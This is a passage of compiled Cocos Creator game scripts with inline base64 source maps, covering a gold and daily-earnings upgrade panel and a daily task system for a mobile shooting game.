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BUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7a0VBQ1k7SUFHbEM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLFFBQVEsQ0FBQztxRUFDZTtJQUdyQztRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsUUFBUSxDQUFDO21FQUNZO0lBR2xDO1FBREMsUUFBUSxDQUFDLEVBQUUsQ0FBQyxRQUFRLENBQUM7c0VBQ2U7SUFHckM7UUFEQyxRQUFRLENBQUMsRUFBRSxDQUFDLE1BQU0sQ0FBQztpRUFDVTtJQUc5QjtRQURDLFFBQVEsQ0FBQyxFQUFFLENBQUMsTUFBTSxDQUFDO2tFQUNXO0lBeEJkLHVCQUF1QjtRQUQzQyxPQUFPO09BQ2EsdUJBQXVCLENBd0czQztJQUFELDhCQUFDO0NBeEdELEFBd0dDLENBeEdvRCxFQUFFLENBQUMsU0FBUyxHQXdHaEU7a0JBeEdvQix1QkFBdUIiLCJmaWxlIjoiIiwic291cmNlUm9vdCI6Ii8iLCJzb3VyY2VzQ29udGVudCI6WyJcclxuaW1wb3J0IHtXb3JsZH0gZnJvbSBcIi4uL2luZm8vV29ybGRcIjtcclxuaW1wb3J0IHtOZXR3b3JrQ29uZmlnfSBmcm9tIFwiLi4vY29uZmlnL05ldHdvcmtDb25maWdcIjtcclxuaW1wb3J0IE5ldHdvcmsgZnJvbSBcIi4uL25ldHdvcmsvTmV0d29ya1wiO1xyXG5pbXBvcnQge2V4dH0gZnJvbSBcIi4uLy4uLy4uL2ZyYW1ld29yay9leHRlbmQvRXh0ZW5kXCI7XHJcbmltcG9ydCB7RXhjZWxDb25maWd9IGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvY29uZmlnL0V4Y2VsQ29uZmlnXCI7XHJcbmltcG9ydCB7RXhjZWxUYWJsZU5hbWVzfSBmcm9tIFwiLi4vY29uZmlnL0V4Y2VsVGFibGVOYW1lc1wiO1xyXG5pbXBvcnQgRmFjYWRlIGZyb20gXCIuLi8uLi8uLi9mcmFtZXdvcmsvZmFjYWRlL0ZhY2FkZVwiO1xyXG5cclxuY29uc3Qge2NjY2xhc3MsIHByb3BlcnR5fSA9IGNjLl9kZWNvcmF0b3I7XHJcblxyXG5AY2NjbGFzc1xyXG5leHBvcnQgZGVmYXVsdCBjbGFzcyBFYXJuaW5nc0xheWVyQ29udHJvbGxlciBleHRlbmRzIGNjLkNvbXBvbmVudCB7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlJpY2hUZXh0KVxyXG4gICAgZ29sZEx2TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBkYXlFYXJuTHZMYWJlbDogY2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGdvbGRDb3N0TGFiZWw6IGNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuUmljaFRleHQpXHJcbiAgICBkYXlFYXJuQ29zdExhYmVsOiBjYy5SaWNoVGV4dCA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLlJpY2hUZXh0KVxyXG4gICAgZ29sZFdvcnRoTGFiZWw6Y2MuUmljaFRleHQgPSBudWxsO1xyXG5cclxuICAgIEBwcm9wZXJ0eShjYy5SaWNoVGV4dClcclxuICAgIGRheUVhcm5Xb3J0aExhYmVsOmNjLlJpY2hUZXh0ID0gbnVsbDtcclxuXHJcbiAgICBAcHJvcGVydHkoY2MuQnV0dG9uKVxyXG4gICAgZ29sZEx2QnV0dG9uOmNjLkJ1dHRvbiA9IG51bGw7XHJcblxyXG4gICAgQHByb3BlcnR5KGNjLkJ1dHRvbilcclxuICAgIGRheUVhcm5CdXR0b246Y2MuQnV0dG9uID0gbnVsbDtcclxuXHJcbiAgICBvbkxvYWQgKCkge1xyXG4gICAgICAgIHRoaXMudXBkYXRlR29sZFVwKCk7XHJcbiAgICAgICAgdGhpcy51cGRhdGVEYXlFYXJuVXAoKTtcclxuICAgICAgICBjYy5maW5kKCdDYW52YXMnKS5vbihcIlVwZGF0ZVN0b3JhZ2VcIiwgdGhpcy5vblVwZGF0ZVN0b3JhZ2VFdmVudCwgdGhpcyk7XHJcbiAgICB9XHJcblxyXG4gICAgb25EZXN0cm95KCl7XHJcbiAgICAgICAgY2MuZmluZCgnQ2FudmFzJykub2ZmKFwiVXBkYXRlU3RvcmFnZVwiLCB0aGlzLm9uVXBkYXRlU3RvcmFnZUV2ZW50LCB0aGlzKTtcclxuICAgIH1cclxuXHJcbiAgICBvblVwZGF0ZVN0b3JhZ2VFdmVudChrZXk6c3RyaW5nKXtcclxuICAgICAgICBpZiAoa2V5ID09IFwiZ29sZENvdW50XCIpe1xyXG4gICAgICAgICAgICBsZXQgY2ZnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuR29sZFVwKTtcclxuICAgICAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZ29sZEx2IDwgY2ZnLmxlbmd0aCl7XHJcbiAgICAgICAgICAgICAgICBsZXQgbmVlZENvc3QgPSBjZmdbV29ybGQuU3RvcmFnZS5nb2xkTHYtMV1bJ2d2YWx1ZV9leHBlbmQnXTtcclxuICAgICAgICAgICAgICAgIHRoaXMuZ29sZEx2QnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgICAgICAgICAgdGhpcy5nb2xkQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmdvbGRMdkJ1dHRvbi5pbnRlcmFjdGFibGU/Y2MuQ29sb3IuV0hJVEU6Y2MuQ29sb3IuUkVELmZyb21IRVgoXCIjOTI0MzM4XCIpO1xyXG4gICAgICAgICAgICB9XHJcbiAgICAgICAgICAgIGlmIChXb3JsZC5TdG9yYWdlLmRheUVhcm5MdiA8IGNmZy5sZW5ndGgpe1xyXG4gICAgICAgICAgICAgICAgbGV0IG5lZWRDb3N0ID0gY2ZnW1dvcmxkLlN0b3JhZ2UuZGF5RWFybkx2LTFdWydvbl9ob29rX2V4cGVuZCddO1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kYXlFYXJuQnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgICAgICAgICAgdGhpcy5kYXlFYXJuQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmRheUVhcm5CdXR0b24uaW50ZXJhY3RhYmxlP2NjLkNvbG9yLldISVRFOmNjLkNvbG9yLlJFRC5mcm9tSEVYKFwiIzkyNDMzOFwiKTtcclxuICAgICAgICAgICAgfVxyXG4gICAgICAgIH1cclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVHb2xkVXAoKXtcclxuICAgICAgICBsZXQgY2ZnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuR29sZFVwKTtcclxuICAgICAgICB0aGlzLmdvbGRMdkxhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTQ+6YeR5biB5Lu35YC8THYuJHtXb3JsZC5TdG9yYWdlLmdvbGRMdn08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZ29sZEx2ID49IGNmZy5sZW5ndGgpe1xyXG4gICAgICAgICAgICB0aGlzLmdvbGRDb3N0TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz7mu6Hnuqc8L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZEx2QnV0dG9uLmludGVyYWN0YWJsZSA9IGZhbHNlO1xyXG4gICAgICAgIH1lbHNlIHtcclxuICAgICAgICAgICAgbGV0IG5lZWRDb3N0ID0gY2ZnW1dvcmxkLlN0b3JhZ2UuZ29sZEx2LTFdWydndmFsdWVfZXhwZW5kJ107XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZENvc3RMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7ZXh0LnNob3J0Rm9ybWF0KG5lZWRDb3N0KX08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgICAgIHRoaXMuZ29sZEx2QnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgIH1cclxuICAgICAgICB0aGlzLmdvbGRDb3N0TGFiZWwubm9kZS5jb2xvciA9IHRoaXMuZ29sZEx2QnV0dG9uLmludGVyYWN0YWJsZT9jYy5Db2xvci5XSElURTpjYy5Db2xvci5SRUQuZnJvbUhFWChcIiM5MjQzMzhcIik7XHJcbiAgICAgICAgdGhpcy5nb2xkV29ydGhMYWJlbC5zdHJpbmcgPSBgPGI+PG91dGxpbmUgY29sb3I9IzFlMWUxZSB3aWR0aD0zPiR7TWF0aC5mbG9vcihjZmdbV29ybGQuU3RvcmFnZS5nb2xkTHYtMV1bJ2d2YWx1ZSddKjEwMCl9JTwvb3V0bGluZT48L2I+YDtcclxuICAgIH1cclxuXHJcbiAgICB1cGRhdGVEYXlFYXJuVXAoKXtcclxuICAgICAgICBsZXQgY2ZnID0gRXhjZWxDb25maWcuZ2V0RXhjZWxUYWJsZShFeGNlbFRhYmxlTmFtZXMuR29sZFVwKTtcclxuICAgICAgICB0aGlzLmRheUVhcm5MdkxhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTQ+5pel5bi45pS255uKTHYuJHtXb3JsZC5TdG9yYWdlLmRheUVhcm5Mdn08L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgaWYgKFdvcmxkLlN0b3JhZ2UuZGF5RWFybkx2ID49IGNmZy5sZW5ndGgpe1xyXG4gICAgICAgICAgICB0aGlzLmRheUVhcm5Db3N0TGFiZWwuc3RyaW5nID0gYDxiPjxvdXRsaW5lIGNvbG9yPSMxZTFlMWUgd2lkdGg9Mz7mu6Hnuqc8L291dGxpbmU+PC9iPmA7XHJcbiAgICAgICAgICAgIHRoaXMuZGF5RWFybkJ1dHRvbi5pbnRlcmFjdGFibGUgPSBmYWxzZTtcclxuICAgICAgICB9ZWxzZSB7XHJcbiAgICAgICAgICAgIGxldCBuZWVkQ29zdCA9IGNmZ1tXb3JsZC5TdG9yYWdlLmRheUVhcm5Mdi0xXVsnb25faG9va19leHBlbmQnXTtcclxuICAgICAgICAgICAgdGhpcy5kYXlFYXJuQ29zdExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQobmVlZENvc3QpfTwvb3V0bGluZT48L2I+YDtcclxuICAgICAgICAgICAgdGhpcy5kYXlFYXJuQnV0dG9uLmludGVyYWN0YWJsZSA9IFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50ID49IG5lZWRDb3N0O1xyXG4gICAgICAgIH1cclxuXHJcbiAgICAgICAgdGhpcy5kYXlFYXJuQ29zdExhYmVsLm5vZGUuY29sb3IgPSB0aGlzLmRheUVhcm5CdXR0b24uaW50ZXJhY3RhYmxlP2NjLkNvbG9yLldISVRFOmNjLkNvbG9yLlJFRC5mcm9tSEVYKFwiIzkyNDMzOFwiKTtcclxuICAgICAgICB0aGlzLmRheUVhcm5Xb3J0aExhYmVsLnN0cmluZyA9IGA8Yj48b3V0bGluZSBjb2xvcj0jMWUxZTFlIHdpZHRoPTM+JHtleHQuc2hvcnRGb3JtYXQoY2ZnW1dvcmxkLlN0b3JhZ2UuZGF5RWFybkx2LTFdWydvbl9ob29rJ10pfTwvb3V0bGluZT48L2I+YDtcclxuICAgIH1cclxuXHJcbiAgICBvbkNsaWNrVXBHb2xkTHYoZXZlbnQsIGRhdGEpe1xyXG4gICAgICAgIGNvbnNvbGUubG9nKFwi44CQY2xpY2vjgJFFYXJuaW5nc0xheWVyQ29udHJvbGxlciBVcEdvbGRMdlwiKVxyXG4gICAgICAgIFxyXG4gICAgICAgIGxldCBjZmcgPSBFeGNlbENvbmZpZy5nZXRFeGNlbFRhYmxlKEV4Y2VsVGFibGVOYW1lcy5Hb2xkVXApO1xyXG4gICAgICAgIGxldCBuZWVkQ29zdCA9IGNmZ1tXb3JsZC5TdG9yYWdlLmdvbGRMdi0xXVsnZ3ZhbHVlX2V4cGVuZCddO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZENvdW50IC09IG5lZWRDb3N0O1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZ29sZEx2Kys7XHJcbiAgICAgICAgdGhpcy51cGRhdGVHb2xkVXAoKTtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiR29sZFdvcnRoVXBcIik7XHJcbiAgICB9XHJcblxyXG4gICAgb25DbGlja1VwRGF5RWFybkx2KGV2ZW50LCBkYXRhKXtcclxuICAgICAgICBjb25zb2xlLmxvZyhcIuOAkGNsaWNr44CRRWFybmluZ3NMYXllckNvbnRyb2xsZXIgVXBEYXlFYXJuTHZcIilcclxuXHJcbiAgICAgICAgbGV0IGNmZyA9IEV4Y2VsQ29uZmlnLmdldEV4Y2VsVGFibGUoRXhjZWxUYWJsZU5hbWVzLkdvbGRVcCk7XHJcbiAgICAgICAgbGV0IG5lZWRDb3N0ID0gY2ZnW1dvcmxkLlN0b3JhZ2UuZGF5RWFybkx2LTFdWydvbl9ob29rX2V4cGVuZCddO1xyXG4gICAgICAgIFdvcmxkLlN0b3JhZ2UuZGF5RWFybkx2Kys7XHJcbiAgICAgICAgV29ybGQuU3RvcmFnZS5nb2xkQ291bnQgLT0gbmVlZENvc3Q7XHJcbiAgICAgICAgdGhpcy51cGRhdGVEYXlFYXJuVXAoKTtcclxuICAgICAgICBGYWNhZGUuY2FudmFzTm9kZS5lbWl0KFwiR29sZERheUVhcm5VcFwiKTtcclxuICAgIH1cclxufVxyXG4iXX0=
//------QC-SOURCE-SPLIT------

                (function() {
                    var nodeEnv = typeof require !== 'undefined' && typeof process !== 'undefined';
                    var __module = nodeEnv ? module : {exports:{}};
                    var __filename = 'preview-scripts/assets/script/app/info/Task.js';
                    var __require = nodeEnv ? function (request) {
                        return cc.require(request);
                    } : function (request) {
                        return __quick_compile_project__.require(request, __filename);
                    };
                    function __define (exports, require, module) {
                        if (!nodeEnv) {__quick_compile_project__.registerModule(__filename, module);}"use strict";
cc._RF.push(module, '763c02OmEBA5Yyyt0WowwAG', 'Task');
// script/app/info/Task.ts

Object.defineProperty(exports, "__esModule", { value: true });
var World_1 = require("./World");
var ExcelTableNames_1 = require("../config/ExcelTableNames");
var ExcelConfig_1 = require("../../../framework/config/ExcelConfig");
var _a = cc._decorator, ccclass = _a.ccclass, property = _a.property;
var Task = /** @class */ (function () {
    function Task() {
    }
    Task.initCurrentLvData = function () {
        this._taskItemsOfCurrentLv = this._taskProxy.list.map(function (value) { return ({ id: value.id, num: 0, take: false }); });
    };
    Task.mergeCurrentLvData = function () {
        var _this = this;
        console.log("mergeCurrentLvData==>");
        console.log(this._taskItemsOfCurrentLv, "this._taskItemsOfCurrentLv");
        var update = false;
        this._taskItemsOfCurrentLv.forEach(function (value, index) {
            var line = ExcelConfig_1.ExcelConfig.getExcelLine(ExcelTableNames_1.ExcelTableNames.task, "id", value.id);
            if (value.num > 0 && _this._taskProxy.list[index].num < line['num']) {
                _this._taskProxy.list[index].num += value.num;
                if (_this._taskProxy.list[index].num >= line['num']) {
                    _this._taskProxy.list[index].num = line['num'];
                }
                update = true;
            }
        });
        if (update) {
            this.write();
        }
    };
    Task.write = function () {
        World_1.World.Storage.task = JSON.stringify(this._taskProxy);
    };
    Task.addNum = function (taskId, num) {
        console.log("======>addNum", taskId, num);
        var find = this._taskItemsOfCurrentLv.find(function (value) { return value.id == taskId; });
        if (find) {
            find.num += num;
        }
        console.log(this._taskItemsOfCurrentLv, "----");
    };
    /** 任务只增不减 */
    /** 击碎靶子 */
    Task.killEnemy = function () {
        this.addNum(1, 1);
    };
    /** 击碎幸运转盘 */
    Task.killLuckyEnemy = function () {
        this.addNum(2, 1);
    };
    /** 触发疯狂模式 */
    Task.triggerCrazy = function () {
        this.addNum(3, 1);
    };
    /** 打败Boss */
    Task.killBoss = function () {
        this.addNum(4, 1);
    };
    /** 使用道具 */
    Task.useTool = function () {
        this.addNum(5, 1);
    };
    Task.init = function () {
        console.log("Task.initBullet===>");
        /** 初始每日任务表 */
        var task = JSON.parse(World_1.World.Storage.task);
        if (!task || !task.expireTime || task.expireTime <= World_1.World.My.serverTime) {
            /** 更新任务 */
            task = {};
            /** 计算今天的时分秒 */
            var date = new Date(World_1.World.My.serverTime);
            console.log(date.getFullYear() + "\u5E74" + date.getMonth() + "\u6708" + date.getDay() + "\u65E5" + date.getHours() + "\u65F6" + date.getMinutes() + "\u5206" + date.getSeconds() + "\u79D2" + date.getMilliseconds() + "\u6BEB\u79D2");
            var cd = 24 * 60 * 60 - (date.getHours() * 60 * 60 + date.getMinutes() * 60 + date.getSeconds());
            var h = Math.floor(cd / 3600);
            var m = Math.floor((cd - h * 3600) / 60);
            var s = cd % 60;
            console.log(h + "\u65F6" + m + "\u5206" + s + "\u79D2-----------");
            task.expireTime = World_1.World.My.serverTime + cd * 1000 - date.getMilliseconds();
            task.box = false;
            task.list = [];
            /** 随机三个任务 */
            var taskDatas = ExcelConfig_1.ExcelConfig.getExcelTable(ExcelTableNames_1.ExcelTableNames.task).filter(function (value) { return value['type'] == 1; });
            for (var i = 0; i < 3; i++) {
                var index = Math.floor(Math.random() * 100) % taskDatas.length;
                var item = taskDatas[index];
                console.log(index, item['id'], "=====");
                task.list.push({ id: parseInt(item['id']), num: 0, take: false });
                taskDatas.splice(index, 1);
            }
            World_1.World.Storage.task = JSON.stringify(task);
        }
        else if (task && !task.list) {
            this._taskProxy.list = [];
            for (var key in this._taskProxy) {
                if (key != 'expireTime' && key != 'box' && key != 'list') {
                    var id = parseInt(key);
                    var num = this._taskProxy[key];
                    var line = ExcelConfig_1.ExcelConfig.getExcelLine(ExcelTableNames_1.ExcelTableNames.task, "id", id);
                    if (line['num']) {
                        var take = num >= line['num'];
                        this._taskProxy.list.push({ id: id, num: num, take: take });
                    }
                }
            }
        }
        this._taskProxy = task;
        this.initCurrentLvData();
    };
    Object.defineProperty(Task, "taskProxy", {
        get: function () {
            return this._taskProxy;
        },
        enumerable: false,
        configurable: true
    });
    Object.defineProperty(Task, "taskItemsOfCurrentLv", {
        get: function () {
            return this._taskItemsOfCurrentLv;
        },
        enumerable: false,
        configurable: true
    });
    Task = __decorate([
        ccclass
    ], Task);
    return Task;
}());
exports.default = Task;

cc._RF.pop();
                    }
                    if (nodeEnv) {
                        __define(__module.exports, __require, __module);
                    }
                    else {
                        __quick_compile_project__.registerModuleFunc(__filename, function () {
                            __define(__module.exports, __require, __module);
                        });
                    }
                })();
//# sourceMappingURL=data:application/json;charset=utf-8;base64,eyJ2ZXJzaW9uIjozLCJzb3VyY2VzIjpbImFzc2V0cy9zY3JpcHQvYXBwL2luZm8vVGFzay50cyJdLCJuYW1lcyI6W10sIm1hcHBpbmdzIjoiOzs7Ozs7Ozs7Ozs7Ozs7O0FBQ0EsaUNBQThCO0FBQzlCLDZEQUEwRDtBQUMxRCxxRUFBa0U7QUFFNUQsSUFBQSxLQUFzQixFQUFFLENBQUMsVUFBVSxFQUFsQyxPQUFPLGFBQUEsRUFBRSxRQUFRLGNBQWlCLENBQUM7QUFjMUM7SUFBQTtJQThIQSxDQUFDO0lBMUhrQixzQkFBaUIsR0FBaEM7UUFDSSxJQUFJLENBQUMscUJBQXFCLEdBQUcsSUFBSSxDQUFDLFVBQVUsQ0FBQyxJQUFJLENBQUMsR0FBRyxDQUFDLFVBQUEsS0FBSyxJQUFJLE9BQUEsQ0FBZSxFQUFDLEVBQUUsRUFBQyxLQUFLLENBQUMsRUFBRSxFQUFFLEdBQUcsRUFBQyxDQUFDLEVBQUUsSUFBSSxFQUFDLEtBQUssRUFBQyxDQUFBLEVBQS9DLENBQStDLENBQUMsQ0FBQztJQUNwSCxDQUFDO0lBRU8sdUJBQWtCLEdBQTFCO1FBQUEsaUJBaUJDO1FBaEJHLE9BQU8sQ0FBQyxHQUFHLENBQUMsdUJBQXVCLENBQUMsQ0FBQztRQUNyQyxPQUFPLENBQUMsR0FBRyxDQUFDLElBQUksQ0FBQyxxQkFBcUIsRUFBRSw0QkFBNEIsQ0FBQyxDQUFDO1FBQ3RFLElBQUksTUFBTSxHQUFHLEtBQUssQ0FBQztRQUNuQixJQUFJLENBQUMscUJBQXFCLENBQUMsT0FBTyxDQUFDLFVBQUMsS0FBSyxFQUFFLEtBQUs7WUFDNUMsSUFBSSxJQUFJLEdBQUcseUJBQVcsQ0FBQyxZQUFZLENBQUMsaUNBQWUsQ0FBQyxJQUFJLEVBQUUsSUFBSSxFQUFFLEtBQUssQ0FBQyxFQUFFLENBQUMsQ0FBQztZQUMxRSxJQUFJLEtBQUssQ0FBQyxHQUFHLEdBQUcsQ0FBQyxJQUFJLEtBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLEVBQUM7Z0JBQy9ELEtBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsSUFBSSxLQUFLLENBQUMsR0FBRyxDQUFDO2dCQUM3QyxJQUFJLEtBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsSUFBSSxJQUFJLENBQUMsS0FBSyxDQUFDLEVBQUM7b0JBQy9DLEtBQUksQ0FBQyxVQUFVLENBQUMsSUFBSSxDQUFDLEtBQUssQ0FBQyxDQUFDLEdBQUcsR0FBRyxJQUFJLENBQUMsS0FBSyxDQUFDLENBQUM7aUJBQ2pEO2dCQUNELE1BQU0sR0FBRyxJQUFJLENBQUM7YUFDakI7UUFDTCxDQUFDLENBQUMsQ0FBQztRQUNILElBQUksTUFBTSxFQUFDO1lB